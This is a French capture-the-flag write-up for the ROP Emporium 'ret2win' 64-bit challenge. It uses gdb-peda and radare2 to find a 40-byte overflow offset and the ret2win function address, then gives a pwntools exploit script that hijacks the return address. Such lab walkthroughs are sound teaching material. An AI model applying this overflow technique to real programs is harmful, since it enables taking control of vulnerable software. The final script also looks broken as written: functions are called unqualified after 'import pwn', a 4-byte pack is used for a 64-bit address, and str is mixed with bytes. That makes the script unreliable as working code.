# ret2win Rop Emporium 

## En parcourant le net j'ai remarqué qu'aucun write-up n'existe en français pour ROP Emporium. J'ai donc tout simplement décidé de faire le write-up de tout les chall's ROP emporium


Donc voici le chall : [ret2win](https://ropemporium.com/challenge/ret2win.html)
On va faire le 64 bits

On commence par regarder le programme dans gdb-peda :
```
[quasar@pwn ret2win]$ gdb ./ret2win
```
ensuite on essaie de trouver l'offset
```
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ r
Starting program: /home/quasar/Bureau/Pwn/ret2win/ret2win 
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffdec0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
RBX: 0x0 
RCX: 0x0 
RDX: 0x0 
RSI: 0x6022a1 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
RDI: 0x7ffff7f94330 --> 0x0 
RBP: 0x6141414541412941 ('A)AAEAAa')
RSP: 0x7fffffffdee8 ("AA0AAFAAb")
RIP: 0x400810 (<pwnme+91>:	ret)
R8 : 0x7fffffffdec0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
R9 : 0x40 ('@')
R10: 0x410 
R11: 0x246 
R12: 0x400650 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffdfd0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400809 <pwnme+84>:	call   0x400620 <fgets@plt>
   0x40080e <pwnme+89>:	nop
   0x40080f <pwnme+90>:	leave  
=> 0x400810 <pwnme+91>:	ret    
   0x400811 <ret2win>:	push   rbp
   0x400812 <ret2win+1>:	mov    rbp,rsp
   0x400815 <ret2win+4>:	mov    edi,0x4009e0
   0x40081a <ret2win+9>:	mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdee8 ("AA0AAFAAb")
0008| 0x7fffffffdef0 --> 0x400062 --> 0x1f8000000000000 
0016| 0x7fffffffdef8 --> 0x7ffff7df8153 (<__libc_start_main+243>:	mov    edi,eax)
0024| 0x7fffffffdf00 --> 0x0 
0032| 0x7fffffffdf08 --> 0x7fffffffdfd8 --> 0x7fffffffe307 ("/home/quasar/Bureau/Pwn/ret2win/ret2win")
0040| 0x7fffffffdf10 --> 0x100000000 
0048| 0x7fffffffdf18 --> 0x400746 (<main>:	push   rbp)
0056| 0x7fffffffdf20 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400810 in pwnme ()
gdb-peda$ pattern offset "AA0AAFAAb"
AA0AAFAAb found at offset: 40
gdb-peda$ 
```
Donc on voit que c'est 40, maintenant determinont l'addresse de ret2win :
```
[quasar@pwn ret2win]$ r2 -AAA ./ret2win
[Cannot analyze at 0x00400640g with sym. and entry0 (aa)
[x] Analyze all flags starting with sym. and entry0 (aa)
[Cannot analyze at 0x00400640ac)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Finding function preludes
[x] Enable constraint types analysis for variables
 -- Finnished a beer
[0x00400650]> afl
0x00400650    1 41           entry0
0x00400610    1 6            sym.imp.__libc_start_main
0x00400680    4 50   -> 41   sym.deregister_tm_clones
0x004006c0    4 58   -> 55   sym.register_tm_clones
0x00400700    3 28           entry.fini0
0x00400720    4 38   -> 35   entry.init0
0x004007b5    1 92           sym.pwnme
0x00400600    1 6            sym.imp.memset
0x004005d0    1 6            sym.imp.puts
0x004005f0    1 6            sym.imp.printf
0x00400620    1 6            sym.imp.fgets
0x00400811    1 32           sym.ret2win
0x004005e0    1 6            sym.imp.system
0x004008b0    1 2            sym.__libc_csu_fini
0x004008b4    1 9            sym._fini
0x00400840    4 101          sym.__libc_csu_init
0x00400746    1 111          main
0x00400630    1 6            sym.imp.setvbuf
0x004005a0    3 
```
donc c'est 0x00400811
Il nous reste plus qu'a écrire un exploit: 
```python
import pwn 
import struct

offset = "a"*40
ret2win = struct.pack("I", 0x00400811)

p = process("./ret2win")
p.sendline(offset + ret2win)
log.info("Retour: " + str(p.recvall()))
```

Et voila ! 

